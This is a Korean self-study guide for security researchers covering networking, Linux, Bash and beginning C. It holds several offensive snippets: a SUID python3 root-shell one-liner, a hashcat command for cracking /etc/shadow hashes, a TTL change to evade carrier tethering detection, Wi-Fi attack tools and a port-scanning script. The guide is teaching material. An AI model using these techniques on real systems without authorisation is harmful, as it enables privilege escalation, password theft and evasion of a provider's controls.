# 보안 연구자 완전 학습 가이드
# The Complete Security Researcher's Guide

> 이 문서 하나로 네트워크, 프로그래밍, 시스템, 보안을 전부 배울 수 있습니다.
> 대학교 컴퓨터공학과 4년 + 보안 전문 교육을 하나의 파일에 담았습니다.
> 수학이 약해도 괜찮습니다. 필요한 수준만 설명합니다.

---

# 전체 목차

## Part 1: 네트워크 기초
1. [네트워크 기초 개념](#1-네트워크-기초-개념)
2. [OSI 7계층 / TCP-IP 모델](#2-osi-7계층--tcp-ip-모델)
3. [물리 계층 (L1)](#3-물리-계층-l1)
4. [데이터 링크 계층 (L2)](#4-데이터-링크-계층-l2)
5. [네트워크 계층 (L3)](#5-네트워크-계층-l3)
6. [전송 계층 (L4)](#6-전송-계층-l4)
7. [응용 계층 (L7)](#7-응용-계층-l7)
8. [무선 네트워크](#8-무선-네트워크)
9. [네트워크 보안 기초](#9-네트워크-보안-기초)
10. [VPN / 터널링](#10-vpn--터널링)
11. [클라우드 네트워크](#11-클라우드-네트워크)
12. [진단 명령어 모음](#12-진단-명령어-모음)

## Part 2: 리눅스 + 셸 스크립팅
13. [리눅스 기초](#13-리눅스-기초)
14. [리눅스 심화 — 권한, 파일시스템, 서비스](#14-리눅스-심화--권한-파일시스템-서비스)
15. [Bash 셸 스크립팅](#15-bash-셸-스크립팅)

## Part 3: 프로그래밍
16. [C 프로그래밍 기초](#16-c-프로그래밍-기초)
17. [C 프로그래밍 중급 — 포인터와 메모리](#17-c-프로그래밍-중급--포인터와-메모리)
18. [C 프로그래밍 고급 — 동적 메모리](#18-c-프로그래밍-고급--동적-메모리)
19. [C++ 핵심 개념](#19-c-핵심-개념)
20. [Python 프로그래밍](#20-python-프로그래밍)
21. [SQL 기초](#21-sql-기초)
22. [자료구조](#22-자료구조)
23. [알고리즘 기초](#23-알고리즘-기초)

## Part 4: 시스템
24. [컴퓨터 구조 — 하드웨어 기초](#24-컴퓨터-구조--하드웨어-기초)
25. [컴퓨터 구조 — CPU 심화](#25-컴퓨터-구조--cpu-심화)
26. [운영체제 — 프로세스와 메모리](#26-운영체제--프로세스와-메모리)
27. [운영체제 — 커널과 시스템콜](#27-운영체제--커널과-시스템콜)

## Part 5: 어셈블리
28. [ARM 어셈블리 기초](#28-arm-어셈블리-기초)
29. [ARM 어셈블리 심화](#29-arm-어셈블리-심화)
30. [x86-64 어셈블리](#30-x86-64-어셈블리)

## Part 6: 리버스 엔지니어링
31. [리버스 엔지니어링 기초](#31-리버스-엔지니어링-기초)
32. [리버스 엔지니어링 실전](#32-리버스-엔지니어링-실전)

## Part 7: 취약점과 Exploit
33. [취약점 유형 완전 분석](#33-취약점-유형-완전-분석)
34. [Exploit 개발 기초](#34-exploit-개발-기초)
35. [Exploit 개발 심화](#35-exploit-개발-심화)

## Part 8: 보호 기법과 우회
36. [최신 보호 기법과 우회](#36-최신-보호-기법과-우회)

## Part 9: 웹 해킹
37. [웹 기초 — HTTP와 웹 구조](#37-웹-기초--http와-웹-구조)
38. [웹 해킹 — OWASP Top 10](#38-웹-해킹--owasp-top-10)

## Part 10: 암호학
39. [암호학 기초](#39-암호학-기초)
40. [이산수학 — 보안에 필요한 것만](#40-이산수학--보안에-필요한-것만)

## Part 11: 모바일 보안
41. [iOS 내부 구조](#41-ios-내부-구조)
42. [Android 내부 구조](#42-android-내부-구조)

## Part 12: 실전
43. [네트워크 패킷 분석 — Wireshark](#43-네트워크-패킷-분석--wireshark)
44. [CTF 풀이 가이드](#44-ctf-풀이-가이드)
45. [실전 도구 모음](#45-실전-도구-모음)
46. [종합 실습 문제](#46-종합-실습-문제)
47. [테더링 우회 / ADB / 폰 잠금 해제](#47-테더링-우회--adb--폰-잠금-해제)

## Part 13: 학습 스케줄
48. [120일 마스터 플랜](#48-120일-마스터-플랜)

---

# Part 1: 네트워크 기초

---

# 1. 네트워크 기초 개념

## 패킷 (Packet)
네트워크에서 데이터를 전송하는 최소 단위. 큰 데이터를 잘게 쪼개서 각각 헤더(주소 정보)를 붙여 보내고, 도착지에서 다시 조립한다.

```
[헤더: 출발지 IP, 도착지 IP, TTL 등] + [페이로드: 실제 데이터]
```

비유: 택배 상자. 큰 가구를 한 번에 못 보내니까 부품별로 나눠서 각 상자에 주소 라벨(헤더)을 붙여 보내는 것.

## 프로토콜 (Protocol)
두 장치가 통신할 때 지켜야 할 약속/규칙. "어떤 형식으로, 어떤 순서로 데이터를 주고받을 것인가"를 정의한다.

예시: HTTP(웹), FTP(파일 전송), SSH(원격 접속), SMTP(이메일 발송)

## 대역폭 (Bandwidth)
네트워크가 단위 시간에 전송할 수 있는 최대 데이터량. bps(bits per second) 단위.

```
100 Mbps = 초당 약 12.5 MB
1 Gbps = 초당 약 125 MB
```

## 지연 시간 (Latency)
데이터가 출발지에서 목적지까지 도달하는 데 걸리는 시간. 밀리초(ms) 단위.

```
같은 도시 서버: ~1ms
같은 국가: ~10-30ms
대양 횡단: ~100-200ms
```

## IP 주소
네트워크에서 각 장치를 식별하는 고유 번호.

```
IPv4: 192.168.1.100 (32비트, 약 43억 개)
IPv6: 2001:0db8:85a3::8a2e:0370:7334 (128비트)

사설 IP (내부 네트워크):
  10.0.0.0 ~ 10.255.255.255
  172.16.0.0 ~ 172.31.255.255
  192.168.0.0 ~ 192.168.255.255

공인 IP (인터넷에서 고유):
  위의 범위를 제외한 모든 IP
```

## 포트 (Port)
하나의 IP에서 여러 서비스를 구분하는 번호 (0~65535).

```
잘 알려진 포트:
  22   SSH (원격 접속)
  53   DNS (도메인 → IP 변환)
  80   HTTP (웹)
  443  HTTPS (보안 웹)
  3306 MySQL (데이터베이스)
  3389 RDP (원격 데스크톱)

비유: IP = 아파트 건물 주소, 포트 = 호수
  192.168.1.1:80 → "이 건물의 80호에 있는 웹 서버"
```

## MAC 주소
네트워크 카드(NIC)에 공장에서 부여된 고유 물리 주소. 48비트.

```
형식: AA:BB:CC:DD:EE:FF
예시: 00:1A:2B:3C:4D:5E

앞 3바이트(00:1A:2B) = 제조사 식별 (OUI)
뒤 3바이트(3C:4D:5E) = 기기 고유 번호

IP 주소는 바뀔 수 있지만, MAC 주소는 (보통) 고정
```

## 서브넷 마스크 (Subnet Mask)
IP 주소에서 네트워크 부분과 호스트 부분을 구분하는 값.

```
IP: 192.168.1.100
서브넷: 255.255.255.0 (= /24)

2진수로 보면:
  IP:     11000000.10101000.00000001.01100100
  서브넷: 11111111.11111111.11111111.00000000
          ├── 네트워크 (24비트) ──┤├ 호스트 ┤

네트워크 주소: 192.168.1.0
호스트 범위: 192.168.1.1 ~ 192.168.1.254
브로드캐스트: 192.168.1.255
사용 가능 호스트: 254개

CIDR 표기법:
  /24 = 255.255.255.0 (254 호스트)
  /16 = 255.255.0.0 (65,534 호스트)
  /8  = 255.0.0.0 (16,777,214 호스트)
```

## DNS (Domain Name System)
도메인 이름(google.com)을 IP 주소(142.250.196.78)로 변환하는 시스템.

```
조회 과정:
  1. 브라우저: "google.com의 IP가 뭐야?"
  2. 로컬 DNS 캐시 확인 → 없으면
  3. ISP의 DNS 서버에 질의 → 없으면
  4. 루트 DNS → .com DNS → google.com DNS
  5. IP 주소 반환: 142.250.196.78

확인 명령어:
  nslookup google.com
  dig google.com
```

## DHCP (Dynamic Host Configuration Protocol)
네트워크에 연결된 장치에게 자동으로 IP 주소를 할당하는 프로토콜.

```
과정 (DORA):
  1. Discover: 클라이언트가 "IP 주세요" 브로드캐스트
  2. Offer: DHCP 서버가 "이 IP 쓸래?" 제안
  3. Request: 클라이언트가 "네, 그거 주세요" 요청
  4. Acknowledge: 서버가 "확인, 그 IP는 당신 것" 승인

할당 정보: IP 주소, 서브넷 마스크, 기본 게이트웨이, DNS 서버
```

## 게이트웨이 (Gateway)
서로 다른 네트워크를 연결하는 장치. 보통 공유기(라우터)가 기본 게이트웨이.

```
집 네트워크 (192.168.1.x)
     ↕ 기본 게이트웨이 (192.168.1.1 = 공유기)
인터넷

외부로 나가는 모든 트래픽은 게이트웨이를 통과
```

## NAT (Network Address Translation)
사설 IP ↔ 공인 IP 변환. 공유기가 하는 핵심 기능.

```
내부:                    공유기(NAT):              외부:
PC(192.168.1.10) ──→ 공인 IP(203.0.113.5) ──→ 구글 서버
폰(192.168.1.11) ──→ 공인 IP(203.0.113.5) ──→ 구글 서버

여러 사설 IP가 하나의 공인 IP를 공유
공유기가 "어떤 내부 기기의 요청인지" 포트 번호로 구분 (PAT)
```

---

# 2. OSI 7계층 / TCP-IP 모델

```
OSI 7계층          TCP/IP 4계층         데이터 단위       예시
──────────────────────────────────────────────────────────────
7. 응용 (Application)  ┐
6. 표현 (Presentation) ├ 응용 계층      데이터/메시지     HTTP, DNS, SSH
5. 세션 (Session)      ┘
4. 전송 (Transport)      전송 계층      세그먼트          TCP, UDP
3. 네트워크 (Network)    인터넷 계층    패킷              IP, ICMP
2. 데이터 링크 (Data Link)┐
                          ├ 네트워크     프레임            Ethernet, Wi-Fi
1. 물리 (Physical)       ┘  접근 계층   비트              케이블, 전파
```

**캡슐화 (Encapsulation):**
```
데이터를 보낼 때 (위 → 아래):
[데이터] 
  → [TCP 헤더 | 데이터]               (세그먼트)
  → [IP 헤더 | TCP 헤더 | 데이터]      (패킷)
  → [ETH 헤더 | IP | TCP | 데이터 | ETH 트레일러]  (프레임)

편지 비유:
  편지(데이터) → 편지봉투에 넣기(TCP) → 택배상자에 넣기(IP) → 트럭에 싣기(이더넷)
```

---

# 3. 물리 계층 (L1)

```
전기 신호, 빛, 전파를 다루는 가장 낮은 계층.

케이블 종류:
  UTP (Unshielded Twisted Pair): 일반 랜선 (Cat5e, Cat6)
    - Cat5e: 1 Gbps
    - Cat6: 10 Gbps (짧은 거리)
    - 최대 거리: 100m
    
  광섬유 (Fiber Optic): 빛으로 데이터 전송
    - 싱글모드: 수십 km
    - 멀티모드: 수백 m
    - 속도: 100 Gbps+

  동축 케이블 (Coaxial): 케이블 TV, 구형 네트워크

무선:
  Wi-Fi (IEEE 802.11): 2.4GHz / 5GHz / 6GHz
  Bluetooth: 근거리 (10m)
  셀룰러: LTE, 5G
```

---

# 4. 데이터 링크 계층 (L2)

```
같은 네트워크(LAN) 내에서 기기 간 통신을 담당.
MAC 주소를 사용하여 프레임을 전달.

이더넷 프레임 구조:
  [목적지 MAC | 출발지 MAC | 타입 | 페이로드 | FCS]
  6바이트      6바이트      2바이트  46-1500   4바이트

ARP (Address Resolution Protocol):
  IP 주소 → MAC 주소 변환
  "192.168.1.1의 MAC 주소가 뭐야?" → 브로드캐스트
  → "나야! 내 MAC은 AA:BB:CC:DD:EE:FF" → 응답

  arp -a   # ARP 테이블 확인

스위치 (Switch):
  MAC 주소를 학습하여 해당 포트로만 프레임 전달
  허브는 모든 포트에 전달 (비효율적)

VLAN (Virtual LAN):
  하나의 물리적 스위치에서 논리적으로 네트워크 분리
  보안 및 트래픽 관리 목적
```

**보안 관점 — ARP Spoofing:**
```
정상: PC → 게이트웨이(공유기)로 트래픽 전송
공격: 공격자가 "나는 게이트웨이야"라고 가짜 ARP 응답
  → PC가 공격자에게 트래픽 전송 → 공격자가 도청 후 전달
  → 중간자 공격 (Man-in-the-Middle, MITM)

방어: 고정 ARP 테이블, ARP 감시 도구
```

---

# 5. 네트워크 계층 (L3)

## IP (Internet Protocol)
서로 다른 네트워크 간 패킷 전달을 담당.

```
IPv4 패킷 헤더 (20바이트):
  ┌──────┬──────┬──────────────────────┐
  │ 버전  │ IHL  │ 서비스 타입           │
  ├──────┴──────┼──────────────────────┤
  │ 전체 길이    │ 식별자                │
  ├─────────────┼──────────────────────┤
  │ 플래그+오프셋│ TTL    │ 프로토콜     │
  ├─────────────┼───────┼──────────────┤
  │ 헤더 체크섬                          │
  ├──────────────────────────────────────┤
  │ 출발지 IP 주소                       │
  ├──────────────────────────────────────┤
  │ 목적지 IP 주소                       │
  └──────────────────────────────────────┘
```

## TTL (Time To Live)
패킷이 네트워크에서 무한히 떠도는 것을 방지하는 카운터.

```
동작 원리:
  출발: TTL = 64 (Linux/Android) 또는 128 (Windows) 또는 255 (라우터)
  라우터 1 통과: TTL = 63
  라우터 2 통과: TTL = 62
  ...
  TTL = 0 → 패킷 폐기 + ICMP "Time Exceeded" 전송

traceroute가 이 원리를 이용:
  TTL=1 패킷 → 첫 번째 라우터가 응답
  TTL=2 패킷 → 두 번째 라우터가 응답
  ...반복하면 경로 전체를 알 수 있음

테더링 감지와의 관계:
  폰 직접 통신: TTL = 64로 출발 → 통신사에 64 도착
  테더링(PC→폰→통신사): PC가 TTL=128로 출발 → 폰 통과 시 -1 → 통신사에 127 도착
  통신사: "127? 이건 원래 128인 Windows에서 온 거네 → 테더링이다!"
  
  우회: Windows TTL을 65로 설정 → 폰 통과 시 64 → 직접 통신처럼 보임
```

## ICMP (Internet Control Message Protocol)
네트워크 진단용 프로토콜. ping과 traceroute가 이것을 사용.

```
주요 메시지 타입:
  Type 0: Echo Reply (ping 응답)
  Type 3: Destination Unreachable (도달 불가)
  Type 8: Echo Request (ping 요청)
  Type 11: Time Exceeded (TTL 만료)

ping 8.8.8.8          # 연결 확인
traceroute 8.8.8.8    # 경로 추적 (Linux)
tracert 8.8.8.8       # 경로 추적 (Windows)
```

## 라우팅 (Routing)
패킷이 목적지까지 가는 최적 경로를 결정하는 과정.

```
정적 라우팅: 관리자가 수동으로 경로 설정
동적 라우팅: 프로토콜이 자동으로 경로 학습
  - OSPF: 링크 상태 기반 (기업 내부)
  - BGP: 인터넷 전체의 경로 교환 (ISP 간)

라우팅 테이블 확인:
  route -n          # Linux
  netstat -rn       # Linux/macOS
  route print       # Windows
```

---

# 6. 전송 계층 (L4)

## TCP (Transmission Control Protocol)
신뢰성 있는 연결 기반 통신. 데이터 손실 시 재전송.

```
3-Way Handshake (연결 수립):
  클라이언트 → SYN → 서버          "연결하고 싶어"
  클라이언트 ← SYN+ACK ← 서버     "좋아, 나도"
  클라이언트 → ACK → 서버          "확인, 시작하자"

4-Way Handshake (연결 종료):
  클라이언트 → FIN → 서버          "끊을게"
  클라이언트 ← ACK ← 서버         "알겠어"
  클라이언트 ← FIN ← 서버         "나도 끊을게"
  클라이언트 → ACK → 서버          "확인"

특징: 순서 보장, 재전송, 흐름 제어, 혼잡 제어
용도: 웹(HTTP), 이메일(SMTP), 파일 전송(FTP), SSH
```

**보안 관점 — TCP SYN Flood:**
```
공격: SYN만 대량 전송하고 ACK를 안 보냄
  → 서버가 "연결 대기" 상태로 자원 소모
  → 정상 사용자 연결 불가 (DoS 공격)
방어: SYN Cookies, 방화벽 rate limiting
```

## UDP (User Datagram Protocol)
비연결, 비신뢰성 통신. 빠르지만 손실 가능.

```
특징: 연결 설정 없음, 재전송 없음, 순서 보장 없음
용도: DNS, 게임, 스트리밍, VoIP, VPN(WireGuard)

TCP vs UDP:
  TCP = 등기 우편 (확인, 추적, 느림)
  UDP = 일반 우편 (빠름, 분실 가능)
```

---

# 7. 응용 계층 (L7)

```
HTTP (HyperText Transfer Protocol):
  웹 통신의 기본 프로토콜
  
  요청 메서드:
    GET    : 데이터 조회 (URL에 파라미터)
    POST   : 데이터 전송 (본문에 데이터)
    PUT    : 데이터 수정
    DELETE : 데이터 삭제
  
  상태 코드:
    200 OK           : 성공
    301 Moved        : 영구 이동 (리다이렉트)
    403 Forbidden    : 접근 거부
    404 Not Found    : 페이지 없음
    500 Internal Error: 서버 오류

HTTPS: HTTP + TLS 암호화 (포트 443)

SSH (Secure Shell): 암호화된 원격 접속 (포트 22)
FTP: 파일 전송 (포트 21) — 암호화 없음, SFTP 권장
SMTP: 이메일 발송 (포트 25/587)
POP3/IMAP: 이메일 수신 (포트 110/143)
```

---

# 8. 무선 네트워크

```
Wi-Fi 표준:
  802.11b  : 2.4GHz, 11Mbps
  802.11g  : 2.4GHz, 54Mbps
  802.11n  : 2.4/5GHz, 600Mbps (Wi-Fi 4)
  802.11ac : 5GHz, 6.9Gbps (Wi-Fi 5)
  802.11ax : 2.4/5/6GHz, 9.6Gbps (Wi-Fi 6)

보안 프로토콜:
  WEP  : 취약 (수분 내 크랙 가능) — 사용 금지!
  WPA  : TKIP 사용 — 취약점 존재
  WPA2 : AES-CCMP — 현재 표준
  WPA3 : SAE 핸드셰이크 — 최신, 가장 안전

Wi-Fi 공격:
  1. Deauth Attack: 클라이언트의 연결을 강제로 끊음
  2. Evil Twin: 같은 SSID의 가짜 AP 생성 → 트래픽 도청
  3. WPA2 Handshake Capture → 오프라인 비밀번호 크래킹
  
  도구: aircrack-ng, wifite, bettercap
```

---

# 9. 네트워크 보안 기초

```
방화벽 (Firewall):
  네트워크 트래픽을 규칙에 따라 허용/차단
  
  # UFW (Ubuntu)
  sudo ufw enable
  sudo ufw allow 22/tcp      # SSH 허용
  sudo ufw deny 23/tcp       # Telnet 차단
  sudo ufw status
  
  # iptables (저수준)
  sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
  sudo iptables -A INPUT -p tcp --dport 80 -j DROP

IDS/IPS:
  IDS (침입 탐지): 공격을 감지하고 알림 (수동적)
  IPS (침입 방지): 공격을 감지하고 차단 (능동적)
  도구: Snort, Suricata

DPI (Deep Packet Inspection):
  패킷의 내용까지 검사 (헤더뿐 아니라 페이로드까지)
  통신사의 테더링 감지, 중국의 Great Firewall에서 사용
```

---

# 10. VPN / 터널링

```
VPN (Virtual Private Network):
  공용 인터넷 위에 암호화된 사설 터널을 만드는 기술

  ┌────────┐                              ┌────────┐
  │  PC    │ ─── 암호화된 터널 ──────────→ │ VPN    │ ──→ 인터넷
  │        │     (ISP도 내용 못 봄)        │ 서버   │
  └────────┘                              └────────┘

주요 VPN 프로토콜:
  WireGuard    : 최신, 빠름, 코드 간결 (4,000줄)
  OpenVPN      : 오래됨, 안정적, 널리 사용
  IPSec/IKEv2  : 기업용, 모바일에서 안정적
  Tailscale    : WireGuard 기반, 설정 간편, 메시 네트워크

Tailscale 핵심 개념:
  - 각 기기에 100.x.x.x 대역의 고유 IP 부여
  - 기기 간 직접 연결 (P2P), 안 되면 DERP 릴레이 서버 경유
  - Exit Node: 모든 트래픽을 특정 기기를 통해 라우팅
  - 설정: tailscale up --advertise-exit-node (서버)
          tailscale up --exit-node=<IP> (클라이언트)
```

---

# 11. 클라우드 네트워크

```
주요 클라우드:
  AWS (Amazon), GCP (Google), Azure (Microsoft), OCI (Oracle)

Oracle Cloud 네트워크 구조:
  VCN (Virtual Cloud Network): 가상 사설 네트워크
    └── Subnet: VCN 내의 서브네트워크
        └── Security List: 인바운드/아웃바운드 규칙
        └── Instance: 가상 서버 (VM)

이중 방화벽:
  1. OS 방화벽 (iptables/ufw): VM 내부에서 제어
  2. Security List: 클라우드 콘솔에서 제어
  → 둘 다 열어야 외부 접근 가능!
```

---

# 12. 진단 명령어 모음

```bash
# 연결 확인
ping 8.8.8.8                    # 기본 연결 테스트
ping -c 4 google.com            # 4번만 ping

# 경로 추적
traceroute 8.8.8.8              # Linux
tracert 8.8.8.8                 # Windows

# DNS 조회
nslookup google.com
dig google.com
dig +short google.com           # IP만 출력

# 네트워크 인터페이스
ip addr show                    # Linux
ifconfig                        # Linux/macOS (구형)
ipconfig                        # Windows
ipconfig /all                   # Windows 상세

# 포트/연결 확인
ss -tulnp                       # Linux (소켓 상태)
netstat -tulnp                  # Linux (구형)
netstat -an                     # Windows

# 공인 IP 확인
curl ifconfig.me
curl ip.me

# ARP 테이블
arp -a

# 라우팅 테이블
ip route show                   # Linux
route print                     # Windows

# 패킷 캡처
sudo tcpdump -i eth0            # 실시간 캡처
sudo tcpdump -i eth0 port 80    # 80번 포트만
sudo tcpdump -w capture.pcap    # 파일로 저장

# 포트 스캔 (nmap)
nmap -sS 192.168.1.1            # SYN 스캔
nmap -sV 192.168.1.1            # 서비스 버전 탐지
nmap -A 192.168.1.0/24          # 전체 네트워크 스캔
```

---

# Part 2: 리눅스 + 셸 스크립팅

---

# 13. 리눅스 기초

## 왜 리눅스를 배워야 하는가
- 서버의 80%+ 가 리눅스
- 보안 도구 대부분이 리눅스에서 동작
- CTF 문제의 대부분이 리눅스 바이너리
- Android의 커널이 리눅스

## 기본 명령어

```bash
# 파일/디렉토리 탐색
ls                   # 파일 목록
ls -la               # 상세 목록 (숨김 파일 포함)
cd /home/user        # 디렉토리 이동
pwd                  # 현재 위치 확인
mkdir mydir          # 디렉토리 생성
rmdir mydir          # 빈 디렉토리 삭제

# 파일 조작
cp file1 file2       # 복사
mv file1 file2       # 이동/이름 변경
rm file              # 삭제
rm -rf dir/          # 디렉토리 강제 삭제 (주의!)
touch newfile        # 빈 파일 생성

# 파일 내용 보기
cat file             # 전체 내용 출력
head -20 file        # 처음 20줄
tail -20 file        # 마지막 20줄
less file            # 페이지 단위 보기 (q로 종료)
grep "검색어" file   # 문자열 검색
grep -r "검색어" .   # 하위 디렉토리 포함 검색

# 파일 찾기
find / -name "*.conf"        # 이름으로 검색
find / -user root -perm -4000  # SUID 파일 찾기 (권한 상승 포인트!)
locate filename              # 빠른 검색 (DB 기반)

# 텍스트 편집
nano file            # 쉬운 편집기
vi file              # vim 편집기 (i: 입력, Esc: 명령, :wq: 저장종료)

# 파이프와 리다이렉션
ls | grep ".txt"     # 파이프: ls 출력을 grep에 전달
echo "hello" > file  # 덮어쓰기
echo "world" >> file # 이어쓰기
cat < file           # 파일을 입력으로

# 프로세스 관리
ps aux               # 모든 프로세스
top                  # 실시간 프로세스 모니터
htop                 # top의 개선판
kill 1234            # PID 1234 종료
kill -9 1234         # 강제 종료
```

## 사용자와 그룹

```bash
whoami               # 현재 사용자
id                   # UID, GID, 그룹 정보
sudo command         # root 권한으로 실행
su - root            # root로 전환
adduser newuser      # 사용자 추가
passwd newuser       # 비밀번호 설정
usermod -aG sudo newuser  # sudo 그룹에 추가
```

---

# 14. 리눅스 심화 — 권한, 파일시스템, 서비스

## 파일 권한 (가장 중요!)

```
ls -l의 출력:
  -rwxr-xr-- 1 user group 4096 Jan 1 00:00 file.txt
  │├─┤├─┤├─┤
  │ │   │  │
  │ │   │  └── 기타(Others) 권한: r-- (읽기만)
  │ │   └── 그룹(Group) 권한: r-x (읽기+실행)
  │ └── 소유자(Owner) 권한: rwx (읽기+쓰기+실행)
  └── 파일 타입: - (일반), d (디렉토리), l (심볼릭 링크)

권한 숫자 표현:
  r = 4, w = 2, x = 1
  rwx = 4+2+1 = 7
  r-x = 4+0+1 = 5
  r-- = 4+0+0 = 4
  
  chmod 755 file  → rwxr-xr-x
  chmod 644 file  → rw-r--r--
  chmod 600 file  → rw------- (소유자만 읽기/쓰기)

특수 권한:
  SUID (4xxx): 실행 시 파일 소유자 권한으로 실행
    chmod 4755 file  → -rwsr-xr-x
    예: /usr/bin/passwd는 SUID로 root 권한 실행
    → 보안 공격의 핵심 대상! (권한 상승)
  
  SGID (2xxx): 실행 시 파일 그룹 권한으로 실행
  Sticky Bit (1xxx): 소유자만 삭제 가능 (/tmp에 설정됨)
```

**SUID를 이용한 권한 상승:**
```bash
# SUID가 설정된 파일 찾기
find / -perm -4000 -type f 2>/dev/null

# 취약한 SUID 바이너리를 통한 root 획득
# 예: /usr/bin/python3에 SUID가 있다면
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# → root 셸!

# GTFOBins (https://gtfobins.github.io)
# → 각 바이너리별 권한 상승 방법이 정리된 사이트
```

## 파일시스템 구조

```
/              최상위 디렉토리 (루트)
├── /bin       기본 명령어 (ls, cp, mv 등)
├── /sbin      시스템 관리 명령어 (fdisk, reboot)
├── /etc       설정 파일
│   ├── passwd    사용자 정보
│   ├── shadow    암호화된 비밀번호 (root만 읽기 가능!)
│   ├── hosts     호스트네임 → IP 매핑
│   └── ssh/      SSH 설정
├── /home      사용자 홈 디렉토리
├── /root      root 사용자 홈
├── /var       가변 데이터 (로그, 캐시)
│   └── log/   로그 파일
├── /tmp       임시 파일 (누구나 쓰기 가능 — 공격 포인트!)
├── /proc      가상 파일시스템 (프로세스 정보)
│   ├── self/  현재 프로세스
│   │   └── maps  메모리 매핑 (ASLR 주소 확인!)
│   └── [PID]/ 특정 프로세스 정보
├── /dev       장치 파일
│   ├── null   블랙홀 (출력 버리기)
│   ├── zero   무한 0 바이트 소스
│   └── urandom 난수 생성기
└── /usr       사용자 프로그램
    ├── bin/
    ├── lib/
    └── share/
```

## 서비스 관리 (systemd)

```bash
# 서비스 제어
sudo systemctl start nginx      # 서비스 시작
sudo systemctl stop nginx       # 서비스 중지
sudo systemctl restart nginx    # 재시작
sudo systemctl status nginx     # 상태 확인
sudo systemctl enable nginx     # 부팅 시 자동 시작
sudo systemctl disable nginx    # 자동 시작 해제

# 로그 확인
journalctl -u nginx             # 특정 서비스 로그
journalctl -f                   # 실시간 로그 (tail -f 같은)
tail -f /var/log/syslog         # 시스템 로그
tail -f /var/log/auth.log       # 인증 로그 (SSH 로그인 시도 등)

# 열린 포트 확인
ss -tulnp                       # 어떤 프로세스가 어떤 포트를 사용 중인지
```

## /etc/passwd와 /etc/shadow

```
/etc/passwd (누구나 읽기 가능):
  root:x:0:0:root:/root:/bin/bash
  │    │ │ │ │     │      │
  │    │ │ │ │     │      └── 로그인 셸
  │    │ │ │ │     └── 홈 디렉토리
  │    │ │ │ └── 설명
  │    │ │ └── GID (그룹 ID)
  │    │ └── UID (0 = root)
  │    └── x = 비밀번호는 shadow 파일에
  └── 사용자 이름

/etc/shadow (root만 읽기 가능):
  root:$6$salt$hash:18000:0:99999:7:::
  │     │          │
  │     │          └── 마지막 변경일 (1970년부터 일수)
  │     └── 암호화된 비밀번호 ($6$ = SHA-512)
  └── 사용자 이름

비밀번호 크래킹:
  shadow 파일을 얻으면 → hashcat/john으로 오프라인 크래킹 가능
  hashcat -m 1800 -a 0 shadow.txt wordlist.txt
```

---

# 15. Bash 셸 스크립팅

```bash
#!/bin/bash
# 셔뱅(shebang): 이 스크립트를 bash로 실행

# 변수
name="hacker"
echo "Hello, $name"
echo "현재 디렉토리: $(pwd)"
echo "날짜: $(date)"

# 사용자 입력
read -p "이름 입력: " username
echo "안녕, $username"

# 조건문
if [ "$username" = "admin" ]; then
    echo "관리자입니다"
elif [ "$username" = "guest" ]; then
    echo "게스트입니다"
else
    echo "일반 사용자입니다"
fi

# 파일 존재 확인
if [ -f "/etc/passwd" ]; then
    echo "passwd 파일 존재"
fi
# -f: 파일 존재, -d: 디렉토리 존재, -r: 읽기 가능, -w: 쓰기 가능

# 반복문
for i in 1 2 3 4 5; do
    echo "번호: $i"
done

for file in *.txt; do
    echo "텍스트 파일: $file"
done

# while
count=0
while [ $count -lt 5 ]; do
    echo "카운트: $count"
    count=$((count + 1))
done

# 함수
scan_port() {
    local host=$1
    local port=$2
    (echo >/dev/tcp/$host/$port) 2>/dev/null && echo "포트 $port 열림" || echo "포트 $port 닫힘"
}

scan_port "192.168.1.1" 22
scan_port "192.168.1.1" 80
```

**보안 실전 스크립트 예시:**
```bash
#!/bin/bash
# 간단한 포트 스캐너

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "사용법: $0 <대상 IP>"
    exit 1
fi

echo "스캔 대상: $TARGET"
echo "---"

for port in 21 22 23 25 53 80 443 3306 3389 8080; do
    (echo >/dev/tcp/$TARGET/$port) 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[열림] 포트 $port"
    fi
done

echo "---"
echo "스캔 완료"
```

```bash
# 실행
chmod +x scanner.sh
./scanner.sh 192.168.1.1
```

---

# Part 3: 프로그래밍

---

# 16. C 프로그래밍 기초

## 16.1 C 언어란?

C는 1972년 Dennis Ritchie가 만든 프로그래밍 언어입니다.
iOS 커널, Linux 커널, Windows 커널이 전부 C로 작성되어 있습니다.

**왜 보안에 C가 필수인가:**
- 취약점의 80%+가 C/C++의 메모리 관리 실수에서 발생
- C를 이해해야 어셈블리 코드가 읽힘
- C를 이해해야 취약점이 "왜" 발생하는지 알 수 있음

```
Python:  x = "hello"  → 메모리? 알아서 관리됨
C:       char *x = malloc(6); strcpy(x, "hello"); free(x);
         → 메모리를 직접 할당하고, 직접 해제해야 함
         → 실수하면 → 취약점 발생
```

## 16.2 개발 환경 설정

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install gcc gdb build-essential

# 컴파일과 실행
gcc hello.c -o hello
./hello
```

## 16.3 기본 문법

```c
#include <stdio.h>

int main() {
    // 변수와 데이터 타입
    int age = 25;              // 4바이트 정수
    char letter = 'A';         // 1바이트 문자 (ASCII 65)
    float pi = 3.14f;          // 4바이트 실수
    double precise = 3.14159;  // 8바이트 실수
    unsigned int positive = 42; // 부호 없는 정수 (양수만)
    
    printf("나이: %d\n", age);
    printf("문자: %c (ASCII: %d)\n", letter, letter);
    printf("크기: int=%lu, char=%lu 바이트\n", sizeof(int), sizeof(char));
    
    return 0;
}
```

**메모리 저장 방식 (Little-Endian):**
```
int x = 0x12345678;

메모리 주소: 0x1000  0x1001  0x1002  0x1003
저장된 값:  [0x78]  [0x56]  [0x34]  [0x12]
             낮은 바이트가 낮은 주소에!

사람이 읽는 순서: 12 34 56 78
메모리 저장 순서: 78 56 34 12 (뒤집힘!)
→ exploit 작성 시 주소를 뒤집어야 하는 이유
```

**Integer Overflow (보안 핵심!):**
```c
unsigned short x = 65535;  // 최대값
x = x + 1;                // = 0 (오버플로우!)

// 위험한 코드:
unsigned short length = 65530;
unsigned short total = length + 10;  // = 4 (오버플로우!)
char *buf = malloc(total);  // 4바이트만 할당
memcpy(buf, data, length);  // 65530바이트 복사 → 버퍼 오버플로우!
```

## 16.4 연산자 (비트 연산 집중)

```c
// 비트 연산 (암호학, 메모리 조작의 기초)
unsigned char x = 0b11001010;  // 202
unsigned char y = 0b10110101;  // 181

printf("AND: %d\n", x & y);   // 128
printf("OR:  %d\n", x | y);   // 255
